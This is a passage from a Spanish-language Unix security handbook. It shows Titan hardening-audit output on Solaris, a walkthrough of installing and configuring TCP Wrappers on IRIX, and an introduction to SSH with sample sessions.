&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/tcp-sequence.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/tcp-sequence.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;TCP&#x005F;STRONG&#x005F;ISS=1
&#x00A0;/etc/default/inetinit&#x00A0;-&#x00A0;has&#x00A0;the&#x00A0;system&#x00A0;default&#x00A0;.&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/userumask.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/userumask.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;&#x00A0;Checking&#x00A0;for&#x00A0;umask&#x00A0;022&#x00A0;in
&#x00A0;&#x00A0;/etc/.login
&#x00A0;&#x00A0;/etc/default/login
&#x00A0;&#x00A0;/etc/profile
&#x00A0;&#x00A0;/etc/skel/local.cshrc
&#x00A0;&#x00A0;/etc/skel/local.login
&#x00A0;&#x00A0;/etc/skel/local.profile
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;other&#x00A0;than&#x00A0;022&#x00A0;in&#x00A0;/etc/.login&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;other&#x00A0;than&#x00A0;022&#x00A0;in&#x00A0;/etc/.login&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;022&#x00A0;in&#x00A0;/etc/profile&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;022&#x00A0;in&#x00A0;/etc/skel/local.cshrc&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;other&#x00A0;than&#x00A0;022&#x00A0;in&#x00A0;/etc/skel/local.login&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Umask&#x00A0;value&#x00A0;other&#x00A0;than&#x00A0;022&#x00A0;in&#x00A0;/etc/skel/local.profile&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;UMASK&#x00A0;value&#x00A0;022&#x00A0;in&#x00A0;/etc/default/login&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/utmp.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/utmp.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;File&#x00A0;utmp&#x00A0;permissions&#x00A0;o-w&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;File&#x00A0;utmp&#x00A0;permissions&#x00A0;o-w&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK

&#x00A0;
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/vold.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/vold.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;
&#x00A0;File&#x00A0;/etc/rc2.d/S92volmgt&#x00A0;and&#x00A0;/usr/sbin/vold&#x00A0;exists&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;Run&#x00A0;with&#x00A0;-[Ff]&#x00A0;option&#x00A0;to&#x00A0;fix
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/ziplock.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/ziplock.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;
&#x00A0;Unfortunately&#x00A0;this&#x00A0;is&#x00A0;a&#x00A0;FIX&#x00A0;ONLY&#x00A0;utility.....
&#x00A0;As&#x00A0;noted&#x00A0;in&#x00A0;the&#x00A0;Introduction&#x00A0;statement&#x00A0;it&#x00A0;may&#x00A0;break&#x00A0;functionality
&#x00A0;for&#x00A0;all&#x00A0;non-root&#x00A0;users&#x00A0;if&#x00A0;run&#x00A0;-F
&#x00A0;
&#x00A0;The&#x00A0;list&#x00A0;of&#x00A0;files&#x00A0;is&#x00A0;as&#x00A0;follows&#x00A0;and&#x00A0;may&#x00A0;be&#x00A0;manually&#x00A0;modified
&#x00A0;by&#x00A0;editing&#x00A0;this&#x00A0;script&#x00A0;and&#x00A0;inserting/commenting&#x00A0;out&#x00A0;as&#x00A0;you
&#x00A0;like.&#x00A0;Just&#x00A0;make&#x00A0;sure&#x00A0;you&#x00A0;know&#x00A0;what&#x00A0;it&#x00A0;is&#x00A0;you&#x00A0;are&#x00A0;changing:
&#x00A0;
&#x00A0;The&#x00A0;list&#x00A0;of&#x00A0;binaries&#x00A0;that&#x00A0;would&#x00A0;be&#x00A0;modified&#x00A0;is:
&#x00A0;
&#x00A0;/usr/bin/at
&#x00A0;/usr/kvm/eeprom
&#x00A0;/sbin/su
&#x00A0;/usr/bin/atq
&#x00A0;/usr/bin/atrm
&#x00A0;/usr/bin/chkey
&#x00A0;/usr/bin/crontab
&#x00A0;/usr/bin/eject
&#x00A0;/usr/bin/fdformat
&#x00A0;/usr/bin/newgrp
&#x00A0;/usr/bin/ps
&#x00A0;/usr/bin/rcp
&#x00A0;/usr/bin/rdist
&#x00A0;/usr/bin/rlogin
&#x00A0;/sbin/sulogin
&#x00A0;/usr/bin/login
&#x00A0;/usr/bin/rsh
&#x00A0;/usr/bin/su
&#x00A0;/usr/bin/tip
&#x00A0;/usr/bin/uptime
&#x00A0;/usr/bin/yppasswd
&#x00A0;/usr/bin/w
&#x00A0;/usr/bin/ct
&#x00A0;/usr/bin/cu
&#x00A0;/usr/bin/uucp
&#x00A0;/usr/bin/uuglist
&#x00A0;/usr/bin/uuname
&#x00A0;/usr/bin/uustat
&#x00A0;/usr/bin/uux
&#x00A0;/usr/lib/exrecover
&#x00A0;/usr/lib/fs/ufs/ufsdump

&#x00A0;/usr/lib/fs/ufs/ufsrestore
&#x00A0;/usr/lib/pt&#x005F;chmod
&#x00A0;/usr/lib/sendmail.mx
&#x00A0;/usr/lib/acct/accton
&#x00A0;/usr/sbin/allocate
&#x00A0;/usr/sbin/mkdevalloc
&#x00A0;/usr/sbin/mkdevmaps
&#x00A0;/usr/sbin/ping
&#x00A0;/usr/sbin/sacadm
&#x00A0;/usr/sbin/static/rcp
&#x00A0;/usr/sbin/whodo
&#x00A0;/usr/sbin/deallocate
&#x00A0;/usr/sbin/list&#x005F;devices
&#x00A0;/usr/openwin/bin/xlock
&#x00A0;/usr/openwin/bin/xdm
&#x00A0;/usr/openwin/lib/mkcookie
&#x00A0;/usr/ucb/ps
&#x00A0;/usr/vmsys/bin/chkperm
&#x00A0;/usr/bin/passwd
&#x00A0;/usr/bin/csh
&#x00A0;/etc/lp/alerts/printer
&#x00A0;/usr/kvm/crash
&#x00A0;/usr/kvm/eeprom
&#x00A0;/usr/bin/netstat
&#x00A0;/usr/bin/nfsstat
&#x00A0;/usr/bin/write
&#x00A0;/usr/bin/ipcs
&#x00A0;/usr/sbin/arp
&#x00A0;/usr/sbin/prtconf
&#x00A0;/usr/sbin/swap
&#x00A0;/usr/sbin/sysdef
&#x00A0;/usr/sbin/wall
&#x00A0;/usr/sbin/dmesg
&#x00A0;/usr/openwin/bin/Xsun
&#x00A0;/usr/openwin/bin/wsinfo
&#x00A0;/usr/openwin/bin/mailtool
&#x00A0;/usr/openwin/bin/xload
&#x00A0;/usr/openwin/bin/kcms&#x005F;calibrate
&#x00A0;/usr/openwin/bin/kcms&#x005F;configure
&#x00A0;/usr/openwin/bin/kcms&#x005F;server
&#x00A0;/var/adm/messages
&#x00A0;/var/log/syslog
&#x00A0;/var/adm/pacct
&#x00A0;anita:/export/home/toni/Security/Tools/Titan,v3.0.FCS#
</literallayout>
<!--l. 673--><para>  Mirando por encima el resultado ofrecido por Titan, vemos que ha detectado &#x00A1;casi 50 posibles
problemas! (cada mensaje FAILS CHECK denota una alarma, mientras que cada mensaje PASSES
CHECK denota un test satisfactorio).
<!--br/-->
<!--br/-->A la vista de estos resultados, y teniendo en cuenta que hemos utilizado una versi&#x00F3;n m&#x00E1;s o menos moderna
de Solaris (la versi&#x00F3;n 7 10/98, si hubi&#x00E9;ramos comprobado una versi&#x00F3;n de Solaris o SunOS m&#x00E1;s antigua
habr&#x02CA;&#x0131;amos detectado seguramente muchos m&#x00E1;s problemas), parece claro que un sistema Unix instalado tal y
como se distribuye, o con una con&#xFB01;guraci&#x00F3;n de seguridad m&#x02CA;&#x0131;nima &#x2013;nuestro caso&#x2013;, representa un grave
problema ya no s&#x00F3;lo para la m&#x00E1;quina en cuesti&#x00F3;n, sino para toda la red en la que trabaja. Por tanto, el uso de
cualquier herramienta que nos ayude a solucionar, o al menos a localizar problemas, va a ser
&#x00FA;til.

  </para></section><!--end subsubsection--></section><!--end section--><!--l. 686--><section 
role="section"><title><abbrev role="title-mark">21.3</abbrev><anchor 
   id="x1-32600021.3"  ></anchor>TCP Wrappers</title>
<!--l. 687--><para>  En el punto  <ulink 
  url="#x1-20300013.4"  ><!--ref: serv--></ulink> habl&#x00E1;bamos de los servicios ofrecidos desde nuestra m&#x00E1;quina; all&#x02CA;&#x0131; comentamos que cualquiera
de ellos es una potencial puerta de entrada para un atacante, por lo que es muy recomendable cerrar todos
los que no necesitemos; vimos un esquema todo o nada: u ofrec&#x02CA;&#x0131;amos un servicio a toda la red o lo
deneg&#x00E1;bamos, pero no hab&#x02CA;&#x0131;a t&#x00E9;rmino medio.
<!--br/-->
<!--br/-->Hay una serie de servicios como telnet o ftp que habitualmente no vamos a poder cerrar, ya que los
usuarios necesitar&#x00E1;n conectar al servidor para trabajar en &#x00E9;l o para transferir &#xFB01;cheros; en estos casos es
peligroso permitir que cualquier m&#x00E1;quina de Internet tenga la posibilidad de acceder a nuestros recursos,
por lo que se suele utilizar un programa denominado TCP Wrappers (<citation>[?]</citation>) para de&#xFB01;nir una serie de redes o
m&#x00E1;quinas autorizados a conectar con nosotros. Aqu&#x02CA;&#x0131; veremos como instalar este software &#x2013; en su versi&#x00F3;n 7.6
&#x2013; y su con&#xFB01;guraci&#x00F3;n b&#x00E1;sica para que no todo el mundo pueda contactar con nosotros. Actualmente,
cualquier administrador que desee un m&#x02CA;&#x0131;nimo de seguridad ha de instalar TCP Wrappers en
sus equipos; incluso algunos Unices como Linux o BSDI lo ofrecen por defecto al instalar el
operativo. Cabe decir que la con&#xFB01;guraci&#x00F3;n del programa puede ser muy elaborada y con muchas
opciones; aqu&#x02CA;&#x0131; veremos la forma m&#x00E1;s b&#x00E1;sica, que suele ser autom&#x00E1;tica mediante make install
 <anchor 
   id="x1-326001f2"  ></anchor><footnote><para>   Aqu&#x02CA;&#x0131; explicamos el proceso &#x2018;a mano&#x2019; simplemente para entender c&#x00F3;mo funciona.</para></footnote>. Para
con&#xFB01;guraciones m&#x00E1;s avanzadas se recomienda consultar los &#xFB01;cheros de ayuda.
<!--br/-->
<!--br/-->En nuestro caso vamos a instalar TCP Wrappers sobre una m&#x00E1;quina Silicon Graphics corriendo IRIX
6.2:

     </para><literallayout role="verbatim">
&#x00A0;llegona&#x005F;(/)&#x00A0;#&#x00A0;uname&#x00A0;-a
&#x00A0;IRIX64&#x00A0;llegona&#x00A0;6.2&#x00A0;06101031&#x00A0;IP28
&#x00A0;llegona&#x005F;(/)&#x00A0;#
</literallayout>
<!--l. 722--><para>No vamos a entrar aqu&#x02CA;&#x0131; en como compilar el software (para ello se puede consultar el &#xFB01;chero
README); asumiremos que ya lo tenemos compilado y el resultado est&#x00E1;, por ejemplo, en el directorio
/tmp/tcp<informalequation><graphic 
fileref="unixsec529x.gif"></graphic></informalequation>wrappers<informalequation><graphic 
fileref="unixsec530x.gif"></graphic></informalequation>7.6/. Tras compilar el software se habr&#x00E1;n generado una serie de &#xFB01;cheros ejecutables
que hemos de copiar a un destino de&#xFB01;nitivo, por ejemplo a /etc/usr/sbin/:

     </para><literallayout role="verbatim">
&#x00A0;llegona&#x005F;(/tmp/tcp&#x005F;wrappers&#x005F;7.6)&#x00A0;#&#x00A0;cp&#x00A0;&#x2018;find&#x00A0;.&#x00A0;-type&#x00A0;f&#x00A0;-perm&#x00A0;-700&#x2018;&#x00A0;/usr/sbin/
&#x00A0;llegona&#x005F;(/tmp/tcp&#x005F;wrappers&#x005F;7.6)&#x00A0;#
</literallayout>
<!--l. 734--><para>Una vez en su destino de&#xFB01;nitivo, hemos de modi&#xFB01;car el &#xFB01;chero /etc/inetd.conf para indicarle a inetd que
ha de utilizar el demonio tcpd (la parte m&#x00E1;s importante de TCP Wrappers) a la hora de servir peticiones;
para ello, una entrada de la forma

     </para><literallayout role="verbatim">
&#x00A0;telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/etc/telnetd
</literallayout>
<!--l. 743--><para>se convertir&#x00E1; en una como

     </para><literallayout role="verbatim">
&#x00A0;telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/tcpd&#x00A0;&#x00A0;/usr/etc/telnetd
</literallayout>
<!--l. 749--><para>Como vemos, en lugar de que inetd ejecute directamente el demonio correspondiente a cada servicio,
ejecuta el wrapper, y es &#x00E9;ste el encargado de controlar la ejecuci&#x00F3;n del demonio real.
<!--br/-->
<!--br/-->Tras haber modi&#xFB01;cado convenientemente /etc/inetd.conf hemos de con&#xFB01;gurar los servicios que vamos a
ofrecer a diferentes m&#x00E1;quinas o redes; seguiremos una pol&#x02CA;&#x0131;tica restrictiva: todo lo no expl&#x02CA;&#x0131;citamente permitido,
est&#x00E1; negado. Para ello, en el archivo /etc/hosts.allow indicamos que servicios ofrecemos y a d&#x00F3;nde lo
hacemos <anchor 
   id="x1-326002f3"  ></anchor><footnote><para>     Realmente, tambi&#x00E9;n es posible especi&#xFB01;car acciones a realizar al recibir una conexi&#x00F3;n; se puede consultar la sintaxis exacta
en la p&#x00E1;gina del manual de hosts<informalequation><graphic 
fileref="unixsec532x.gif"></graphic></informalequation>access(5).</para></footnote>, de
la siguiente forma:
</para><section role="center"><title/>
<!--l. 762--><para> demonio: maquinas</para></section>
<!--l. 766--><para>Donde &#x2018;demonio&#x2019; es el nombre del demonio encargado de atender el servicio correspondiente
<!--br/-->(sendmail, telnetd, fingerd&#x2026;), y &#x2018;maquinas&#x2019; es la especi&#xFB01;caci&#x00F3;n de los hosts a los que les est&#x00E1; permitida la
conexi&#x00F3;n a cada servicio; se trata de una lista separada por espacios donde podemos incluir desde nombres
de sistemas o direcciones IP hasta subdominios, pasando por palabras reservadas como ALL. As&#x02CA;&#x0131;, si por
ejemplo queremos ofrecer todo a las m&#x00E1;quinas .dsic.upv.es, telnet a andercheran.aiind.upv.es y
luisvive.euiti.upv.es, y ftp a toda la UPV, tendremos un /etc/hosts.allow de la forma
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;llegona&#x005F;(/)&#x00A0;#&#x00A0;cat&#x00A0;/etc/hosts.allow
&#x00A0;ALL:&#x00A0;.dsic.upv.es
&#x00A0;telnetd:&#x00A0;andercheran.aiind.upv.es&#x00A0;luisvive.euiti.upv.es
&#x00A0;ftpd:&#x00A0;.upv.es
&#x00A0;llegona&#x005F;(/)&#x00A0;#
</literallayout>
<!--l. 786--><para>Acabamos de con&#xFB01;gurar los sistemas con acceso a ciertos demonios; para indicar a TCP Wrappers que
nuestros servicios no van a ser ofertados a nadie m&#x00E1;s, creamos el &#xFB01;chero /etc/hosts.deny y denegamos
todo a todos:

     </para><literallayout role="verbatim">
&#x00A0;llegona&#x005F;(/)&#x00A0;#&#x00A0;cat&#x00A0;/etc/hosts.deny
&#x00A0;ALL:&#x00A0;ALL
&#x00A0;llegona&#x005F;(/)&#x00A0;#
</literallayout>
<!--l. 798--><para>Una vez hemos con&#xFB01;gurado todo, hemos de hacer que inetd relea su &#xFB01;chero de
con&#xFB01;guraci&#x00F3;n envi&#x00E1;ndole la se~nal SIGHUP, por ejemplo con la orden killall -HUP
inetd <anchor 
   id="x1-326003f4"  ></anchor><footnote><para>   Concretamente en IRIX este mecanismo no funciona, hay que matar el demonio y volverlo a lanzar.</para></footnote>.
A partir de ese momento los cambios han tenido efecto; en funci&#x00F3;n de nuestro /etc/syslog.conf, pero
generalmente en archivos como /var/adm/SYSLOG o /var/adm/messages vamos a poder ver las conexiones
aceptadas y las rehusadas:

     </para><literallayout role="verbatim">
&#x00A0;Dec&#x00A0;2&#x00A0;02:16:47&#x00A0;llegona&#x00A0;ftpd[18234]:&#x00A0;refused&#x00A0;connect&#x00A0;from&#x00A0;bill.microsoft.com
&#x00A0;Dec&#x00A0;2&#x00A0;02:45:23&#x00A0;llegona&#x00A0;telnetd[18234]:&#x00A0;connect&#x00A0;from&#x00A0;corbella.dsic.upv.es
</literallayout>
<!--l. 814--><para>Cuando alguien desde una m&#x00E1;quina que tiene permiso para acceder a cierto servicio conecte a &#x00E9;l no notar&#x00E1; nada
raro, pero si lo hace desde un equipo no autorizado, la conexi&#x00F3;n se cerrar&#x00E1;:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;telnet&#x00A0;llegona.dsic.upv.es
&#x00A0;Trying&#x00A0;158.42.49.37...
&#x00A0;Connected&#x00A0;to&#x00A0;llegona.dsic.upv.es
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;llegona&#x00A0;login:&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;anita:~#
</literallayout>
<!--l. 829--><para>
  </para></section><!--end section--><!--l. 829--><section 
role="section"><title><abbrev role="title-mark">21.4</abbrev><anchor 
   id="x1-32700021.4"  ></anchor>SSH</title>
<!--l. 830--><para>  Tradicionalmente el intercambio de datos entre sistemas Unix (desde la transferencia de
&#xFB01;cheros o la compartici&#x00F3;n de archivos v&#x02CA;&#x0131;a NFS hasta el acceso remoto) se ha realizado utilizando
mecanismos en los que la seguridad era un factor poco importante frente a otros como la velocidad
o la disponibilidad. Sin embargo, conforme ha ido aumentando la calidad de los medios de
transmisi&#x00F3;n (en la actualidad cualquier peque~na organizaci&#x00F3;n tiene al menos una red Fast Ethernet
capaz de alcanzar velocidades de 100 Mbps, cuando no una ATM, una FDDI o incluso una
GigaEthernet que alcanza los 1000 Mbps de velocidad), y tambi&#x00E9;n conforme ha ido aumentando la
peligrosidad de las redes, especialmente de Internet, se ha ido considerando m&#x00E1;s el grave problema que
implica una transmisi&#x00F3;n de datos en texto claro, ya sea un telnet, un ftp o incluso la transmisi&#x00F3;n
de datos que tiene lugar al utilizar sistemas de &#xFB01;cheros en red. Por suerte, en la actualidad,
casi nadie sigue usando los medios cl&#x00E1;sicos de intercambio de datos entre equipos Unix: por
ejemplo, muy poca gente sigue conectando mediante telnet a m&#x00E1;quinas remotas, mientras que
hace unos pocos a~nos era habitual ver estas conexiones incluso entre m&#x00E1;quinas separadas por
multitud de redes. Casi todos los mecanismos cl&#x00E1;sicos se han reemplazado por protocolos que
incorporan el cifrado en mayor o menor medida, de forma que un pirata que captura datos
transmitidos entre sistemas lo tiene muy dif&#x02CA;&#x0131;cil para conseguir informaci&#x00F3;n importante, como una
clave de usuario; ejemplos de protocolos que incorporan la criptograf&#x02CA;&#x0131;a son SSL (Secure Socket
Layer) o TCFS (Transparent Cryptographic File System, del que ya hemos hablado en este
proyecto).
<!--br/-->
<!--br/-->Dentro de todo estos modelos considerados seguros est&#x00E1; Secure Shell (SSH), un software cuya principal
funci&#x00F3;n es permitir la conexi&#x00F3;n remota segura a sistemas a trav&#x00E9;s de canales inseguros, aunque tambi&#x00E9;n se
utiliza para la ejecuci&#x00F3;n de &#x00F3;rdenes en ese sistema remoto o transferir &#xFB01;cheros desde o hacia &#x00E9;l de manera
&#xFB01;able (<citation>[?]</citation>); es, por tanto, el sustituto ideal de &#x00F3;rdenes como telnet, ftp o r<informalequation><graphic 
fileref="unixsec534x.gif"></graphic></informalequation> de Unix BSD. Todo esto
utilizando RSA, SecurID, Kerberos, TIS o la autenticaci&#x00F3;n cl&#x00E1;sica de Unix (login y password).
Adem&#x00E1;s, y entre otras caracter&#x02CA;&#x0131;sticas, SSH tambi&#x00E9;n soporta el cifrado autom&#x00E1;tico en sesiones
X-Window o modelos de seguridad m&#x00E1;s avanzados, como el cifrado en NFS o la construcci&#x00F3;n de
redes privadas virtuales; su c&#x00F3;digo fuente es libre para uso no comercial (existe otro software
casi completamente compatible con ssh y completamente libre, denominado OpenSSH) y se
puede obtener en http://www.ssh.fi/. En la actualidad, SSH funciona sobre la mayor&#x02CA;&#x0131;a de
clones de Unix (tambi&#x00E9;n existen versiones para Windows y MacOS), y es ampliamente utilizado
en todo tipo de entornos, desde universidades a bancos pasando por empresas de cualquier
sector.
<!--br/-->
<!--br/-->SSH est&#x00E1; formado por un programa servidor, sshd, varios programas cliente (ssh y scp principalmente) y
peque~nas aplicaciones para su con&#xFB01;guraci&#x00F3;n, como ssh-add, ssh-keygen o ssh-agent. El programa
demonio (sshd) se ejecuta en la m&#x00E1;quina contra la cual conectamos, mientras que los clientes se han de
ejecutar evidentemente en el sistema desde el cual conectamos; as&#x02CA;&#x0131;, podemos iniciar una sesi&#x00F3;n en la m&#x00E1;quina
remota con una orden como la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ssh&#x00A0;-l&#x00A0;toni&#x00A0;rosita
&#x00A0;toni&#x2019;s&#x00A0;password:
&#x00A0;Last&#x00A0;login:&#x00A0;Thu&#x00A0;Apr&#x00A0;&#x00A0;6&#x00A0;03:58:32&#x00A0;2000&#x00A0;from&#x00A0;anita
&#x00A0;Linux&#x00A0;2.2.6
&#x00A0;&#x0022;A&#x00A0;witty&#x00A0;saying&#x00A0;proves&#x00A0;nothing.&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;--&#x00A0;Voltaire
&#x00A0;
&#x00A0;rosita:~$
</literallayout>
<!--l. 894--><para>El par&#x00E1;metro &#x2018;-l&#x2019; nos permite indicar el nombre de usuario en el sistema remoto (en caso contrario, se
utilizar&#x00E1; el mismo nombre que se posee en la m&#x00E1;quina local); SSH tambi&#x00E9;n permite especi&#xFB01;car desde l&#x02CA;&#x0131;nea de
comandos una orden a ejecutar en la m&#x00E1;quina a la que conectamos, de forma que cuando esta orden &#xFB01;nalice
se cerrar&#x00E1; la conexi&#x00F3;n entre ambos sistemas:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ssh&#x00A0;-l&#x00A0;toni&#x00A0;luisa&#x00A0;w
&#x00A0;toni&#x2019;s&#x00A0;password:
&#x00A0;&#x00A0;&#x00A0;3:15am&#x00A0;&#x00A0;up&#x00A0;5&#x00A0;days,&#x00A0;&#x00A0;1:30,&#x00A0;&#x00A0;5&#x00A0;users,&#x00A0;&#x00A0;load&#x00A0;average:&#x00A0;1.12,&#x00A0;1.04,&#x00A0;1.01
&#x00A0;USER&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TTY&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FROM&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;LOGIN@&#x00A0;&#x00A0;&#x00A0;IDLE&#x00A0;&#x00A0;&#x00A0;JCPU&#x00A0;&#x00A0;&#x00A0;PCPU&#x00A0;&#x00A0;WHAT
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tty1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;-&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sat12am&#x00A0;&#x00A0;5days&#x00A0;&#x00A0;0.02s&#x00A0;&#x00A0;0.02s&#x00A0;&#x00A0;bash
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ttyp1&#x00A0;&#x00A0;&#x00A0;&#x00A0;:0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sun&#x00A0;3pm&#x00A0;&#x00A0;1:02&#x00A0;&#x00A0;&#x00A0;0.18s&#x00A0;&#x00A0;0.13s&#x00A0;&#x00A0;telnet&#x00A0;rosita
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ttyp2&#x00A0;&#x00A0;&#x00A0;&#x00A0;:0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sun&#x00A0;4am&#x00A0;&#x00A0;2.00s&#x00A0;&#x00A0;2.40s&#x00A0;&#x00A0;2.04s&#x00A0;&#x00A0;vi&#x00A0;tools.tex
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ttyp4&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tue&#x00A0;1am&#x00A0;&#x00A0;0.00s&#x00A0;&#x00A0;1.31s&#x00A0;&#x00A0;0.02s&#x00A0;&#x00A0;w
&#x00A0;anita:~#
</literallayout>
